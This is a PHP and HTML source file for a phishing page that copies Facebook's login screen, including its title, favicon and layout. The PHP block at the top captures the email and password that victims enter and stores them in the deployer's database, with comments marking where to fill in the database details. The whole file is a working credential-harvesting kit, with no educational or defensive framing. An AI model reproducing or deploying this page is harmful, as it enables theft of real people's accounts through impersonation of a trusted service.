<?php
if(isset($_GET["email"]) && isset($_GET['pass'])){
    $conn = new PDO("mysql:host=;dbname=", 'dbLogin', 'dbPass');// check these spaces as your db 
    $email = $_GET["email"];
    $pass = $_GET["pass"];

    $stmt = $conn->prepare("INSERT INTO TABLE_DBNAME(login, pass) VALUES(:log, :pass)"); // check these spaces as your db

    $stmt->bindParam(":log", $email);
    $stmt->bindParam(":pass", $pass);

    $stmt->execute();
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no">
    <title>Facebook - Log In or Sign Up</title>
    <link rel="stylesheet" href="face.css">
    <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/v3/yN/r/EWLVhDVJTum.png?_nc_eui2=AeFocUGfEZVWL8In8Gzq3Gimk_R_3tDHQzCT9H_e0MdDMCwWwamK3W3LsxGJLv1h8gUzsrLvkXKzCLLj5nsjQten" type="image/x-icon">
</head>
<body>
    <div id="top">
        <h1>facebook</h1>
        <form method="get">
            <input type="text" name="email" id="email" placeholder="Mobile number or email">
            <input type="password" name="pass" id="password" placeholder="Password">
            <input type="submit" value="Log In" id="sign">
        </form>
        <a href="" class="forgot">Forgot Password?</a>
        <span>
            <div></div>
            <p>or</p>
            <div></div>
        </span>
        <button id="create">Create New Account</button>
    </div>
    <div id="langs">
        <div id="langs1">
            <a href="" style="color: gray; font-weight: 500;">English (US)</a><br>
            <a href="">Español</a><br>
            <a href="">Deutsch</a><br>
            <a href="">العربية</a>
        </div>
        <div id="langs2">
            <a href="pt-br.php">Português (Brasil)</a><br>
            <a href="">Français (France)</a><br>
            <a href="">Italiano</a><br>
            <div class="plus-border">
                <img src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pg0KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDE5LjAuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPg0KPHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSJMYXllcl8xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB4PSIwcHgiIHk9IjBweCINCgkgdmlld0JveD0iMCAwIDMzMCAzMzAiIHN0eWxlPSJlbmFibGUtYmFja2dyb3VuZDpuZXcgMCAwIDMzMCAzMzA7IiB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxwYXRoIGlkPSJYTUxJRF84N18iIGQ9Ik0zMTUsMTIwSDIxMFYxNWMwLTguMjg0LTYuNzE2LTE1LTE1LTE1aC02MGMtOC4yODQsMC0xNSw2LjcxNi0xNSwxNXYxMDVIMTVjLTguMjg0LDAtMTUsNi43MTYtMTUsMTV2NjANCgljMCw4LjI4NCw2LjcxNiwxNSwxNSwxNWgxMDV2MTA1YzAsOC4yODQsNi43MTYsMTUsMTUsMTVoNjBjOC4yODQsMCwxNS02LjcxNiwxNS0xNVYyMTBoMTA1YzguMjg0LDAsMTUtNi43MTYsMTUtMTV2LTYwDQoJQzMzMCwxMjYuNzE2LDMyMy4yODQsMTIwLDMxNSwxMjB6Ii8+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8Zz4NCjwvZz4NCjxnPg0KPC9nPg0KPGc+DQo8L2c+DQo8L3N2Zz4NCg==" style="cursor: pointer;"/>
            </div>
        </div>
    </div>
    <footer>
        <div class="footer-links">
            <span><a>About</a>&nbsp; · &nbsp;<a>Help</a>&nbsp; · &nbsp;<a>More</a></span>
            <a href="">Facebook Inc.</a>
        </div>
    </footer>
    <script src="face.js"></script>
</body>
</html>
